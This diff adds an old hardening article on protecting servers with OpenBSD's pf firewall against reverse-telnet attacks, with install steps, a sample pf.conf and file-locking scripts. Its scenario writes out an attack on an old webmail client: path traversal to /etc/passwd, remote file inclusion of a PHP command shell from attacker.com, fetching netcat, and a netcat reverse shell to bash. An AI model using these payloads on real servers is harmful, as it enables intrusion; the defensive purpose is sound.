@@ -1,0 +1,214 @@
+-----------------------------------------------------------------------------------------------
+Combating reverse telnet using OpenBSD Packet Filter (pf)
+By: wanvadder@scan-associates.net and flyguy@scan-associates.net
+http://www.scan-associates.net
+-----------------------------------------------------------------------------------------------
+
+
+Introduction:-
+--------------
+
+	This article is meant for those who are going to implement firewall using OpenBSD. The main purpose for this article is to protect servers (such as web, mail, dns and others) within a firewalled network. 
+
+ 	This article is based on my personal experiences and I could not guarantee it will suit all system that you have. Fell free to email me any comments, feedback or any other issues concerning this article. Co-operations from everybody are highly appreciated.
+
+
+Credits:- 
+---------
+
+	Full credit to the software authors for their tools that were used in doing this research. Many thanks to the developers of OpenBSD for creating such a wonderful OS.
+
+Theory:-
+--------
+	If and only if you are familiar with reverse telnet, netcat, http-tunneling and sort, then this article is for you to read, to think and to act in order to minimize successful intrusion attempts. (I strongly believe there is no 100% technique that can be used to stop intrusion when you’re connected to the Internet. IT Security is a process, methodology and effort)
+
+
+Scenario
+--------
+	The following are some examples to illustrate on how reverse telnet session can be used against you if your perimeter defenses are not at the optimum level. In the example, I will describe how to get illegal access to a web server running DragonFly Webmail client.
+
+
+1) User input validation on an older version of DragonFly Webmail client can be a good introductory start.
+
+	On your web browser, typing certain strings and commands in the url box could give you access to the files in the server that is running DragonFly Webmail client. Executing commands like
+
+		http://victim.com/index.php?langc=../../../../../../etc/passwd
+
+would result in displaying the password file in the server. Bad? The worst is yet to come. The attacker can simply implant or upload backdoor programs such as NetCat to get interactive shell in the server.
+
+What will the attacker do? Here's what.... He would need to run a web server and put a file that contains <? system($cmd);?> (let's say cmd.txt). To do reverse telnet using NetCat, the attacker need to upload NetCat to the victim server and he can do it by running two commands using web browser. 
+
+		http://victim.com/index.php?langc=http://attacker.com/cmd.txt&cmd=wget%20-O%20/tmp/nc%20http://attacker.com/nc
+http://victim.com/index.php?langc=http://attacker.com/cmd.txt&cmd=chmod%20755%20/tmp/nc
+
+Then the attacker will use NetCat on his web server to listen for incoming connection throught certain port, lets say port 25.
+		
+#nc –vv –l –p 25
+
+The next step is for the attacker to use NetCat in the victim server to connect back to the attacker's machine. To get interactive shell, the attacker could simply issue a command using a web browser for the victim server to connect to his box.
+
+http://victim.com/index.php?langc=http://attacker.com/cmd.txt&cmd=/tmp/nc%20-vv%20attacker.com%2025%20-e%20/bin/bash
+
+That's it. The attacker will get interactive shell for the victim's server and will have fun with it.
+
+This is one of the scenario that may happen to your server if your firewall configuration allow outbound connection to any IP in the internet. I would say that a good firewall should have a firm configuration and do not allow connections or access needlessly. A strict perimeter defense will minimize the chances of an attacker to do further damage to your network. Nowadays, firewall alone is not sufficient. Firewalls, IDSses and a good security team will be a good pack against the non-ending cyber threats.
+
+
+
+Solution:-
+----------
+To negate such attacks using reverse telnet techniques, you can take several measures. I would like to recommend using OpenBSD if you are looking for a robust OS that have high security features. Installing OpenBSD is very simple and straight forward. If you have any problems installing it or using it, many helps and FAQs can be found at http://www.openbsd.org/faq.html
+
+For a start, this is how to install an OpenBSD box.
+
+Preparing your OpenBSD box
+
+1) partition 
+	/	25% (must be less than 8 G, if you have larger h/disk) 
+	swap	double your memory
+	/tmp	5% 
+	/usr	30%
+	/var	40% (for logging purpose)
+
+2) services
+
+	Disable all services, except ssh for remote maintance, take at look at /etc/rc.conf and set INETD, SENDMAIL to NO and 	pf to YES
+
+3) file system
+
+	edit your /etc/fstab 
+	/dev/wd0a / ffs rw 1 1
+	/dev/wd0d /tmp ffs rw,nodev,nosuid,noexec 1 2
+	/dev/wd0e /usr ffs rw,nodev 1 2
+	/dev/wd0f /var ffs rw,nodev,nosuid,noexec 1 2
+
+
+4) updates your OpenBSD sources
+
+	get scr.tar.gz and srcsys.tar.gz for your OpenBSD version from ftp.openBSD.org and untar it into /usr/src
+	tips:- I would use cvsup rather than cvs because of it’s speed, for more information on how to setup cvsup client 		please refer to www.openbsd.org/anoncvs.html. After finishing upgrading sources, then you have to update the binary 		for your box that can be done by
+	#cd /usr/src && rm –rf /usr/obj && make obj && make build
+
+5) recompile kernel
+
+	for better performance add this to the last line of your /usr/src/sys/arch/i386/conf/GENERIC
+
+	NMBCLUSTER = 10240 
+	MAX_KMAP = 200 
+	MAX_KMAPENT = 8000 
+	NBUF= 16384 
+
+
+	#cd /usr/src/sys/arch/i386/conf/ && config GENERIC && cd ../compile/GENERIC && make depend && make
+
+	then move your new kernel mv /bsd /bsd.old 
+
+	#cp /usr/src/sys/arch/i386/compile/GENERIC/bsd /
+	#chown root.wheel /bsd
+
+6) editing firewall Rules
+
+	Sample /etc/pf.conf for restricting access to all servers (please edit to suit your needs)
+
+	---cut here ---
+	MAIL="" #IP Mail server
+	DNSSERV="" #IP host that offered DNS service
+	DNSCLI="" #IP DNS server for client
+	HTTP="" #IP Web Servis
+	HTTPS="" #IP SSL Enabled
+	SPOOF="" #preventing IP spoofing withing ( in/out ) eg {10.0.0.0/8, 172.16.0.0/16}
+	BLACKLIST="" #eg IP netcraft.net
+	EXTIF="" #External interface firewall eg {fxp0}
+	INTIF="" #Internal interface firewall eg {fxp1}
+	TRUST="" #trusted client monitoring servis / remote management
+	SSHSERV="" #SSHD enabled server format SSHD="{ip,ip,ip}" for remote monitoring services
+	MONITOR="" #IP for monitoring 
+	#scrubing all packets
+	scrub in all
+
+	#default rules, DENY all, don't trust any user input
+	#blocking inbound and outbound packets from external interface 
+	block in log all
+	block out log on $EXTIF from any to any 
+
+	#pass inbound and outbound from local interface
+	pass in quick on lo0 all
+	pass out quick on lo0 all
+	pass in quick on $INTIF all
+	pass out quick on $INTIF all
+
+	#pass outbound from TUSTED HOST(LAN?) and keep state
+	pass out quick on $EXTIF inet proto {tcp,udp} from $TRUST to any keep state
+
+	#we can't tolerate at any port scanning performed into this network
+	#and ip spoofing
+	block in quick on $EXTIF  inet proto tcp from any to any flags FUP/FUP
+	block in quick on $EXTIF  inet proto {tcp,udp} from $SPOOF to 
+	block out quick on $EXTIF  inet proto {tcp,udp} from any to $SPOOF
+
+	#blocking all inbound packet from unwanted site (ie netcraft)
+	block in log quick on $EXTIF inet proto {tcp,udp} from $BLACKLIST to any
+
+	#allowing this host resolve hostname and dns request from specific dns server
+	pass out on $EXTIF inet proto {tcp,udp} from any to $DNSCLI port = domain keep state
+
+	# Allowing Web Services
+	pass in log quick on $EXTIF inet proto {tcp,udp} from any to $HTTP port = http flags S/SA keep state
+	pass in log quick on $EXTIF inet proto {tcp,udp} from any to $HTTPS port = https flags S/SA keep state
+
+	#Allowing remote monitoring over secure channel (SSH)
+	pass in log quick on $EXTIF inet proto {tcp,udp} from $MONITOR to $SSHSERV port = 22 flags S/SA keep state
+
+	#allowing DNS servis
+	pass in log quick on $EXTIF inet proto {tcp,udp} from any to $DNSSERV port = domain flags S/SA keep state
+	pass out log quick on $EXTIF inet proto {tcp,udp} from $DNSSERV to any port = domain keep state
+
+	#allowing receive email to mail relay and send email
+	pass in log quick on $EXTIF inet proto {tcp,udp} from any to $MAIL port = smtp flags S/SA keep state
+	pass out log quick on $EXTIF inet proto {tcp,udp} from $MAIL to any port = smtp keep state
+
+
+7) locking file system and hardening process
+
+	I used to lock my file system so that it’s can't be backdoored, to undo this process for upgrading system sources you 	must boot to single user ( at boot prompt type boot –s ) 
+
+	Script to lock file system
+	---cut here ----
+	#!/bin/sh
+	LOCKING_FILE_SYSTEM={/bin,/sbin,/usr,/bsd,/etc}
+	for d in $LOCKING_FILE_SYSTEM; do
+			/usr/bin/chflags -R schg $d
+			done
+	echo "Finished locking sensitive filesystem"
+	echo "to unlock this file system for performing system updates, reboot to single user and run off.sh"
+
+	--- cut here ----
+
+	Script to unlock file system (make sure you have already remount / and mount the other partition)
+	#mount –u / && mount /tmp && mount /usr && mount /usr
+	--- cut here ----
+	#!/bin/sh
+	#off.sh
+	LOCKING_FILE_SYSTEM={/bin,/sbin,/usr,/bsd,/etc}
+	for d in $LOCKING_FILE_SYSTEM; do
+			/usr/bin/chflags -R noschg $d		
+			done
+	echo "Finished unlocking sensitive filesystem"
+	echo "press CTRL+d to boot your box"
+
+	Conclusion:-
+	More and more application that you choose to run, the more you put your network into danger
+
+Greetings:-
+
+SCAN Clan (tynon,sk,pokleyzz,wyse,Schm|dT,spoonfork,flyguy,s0cket370), kopisusu, eLcc, OOK and #mylinux on dalnet
+
+
+	regards,
+	wanvadder
+	flyguy
+
+
+
+
+
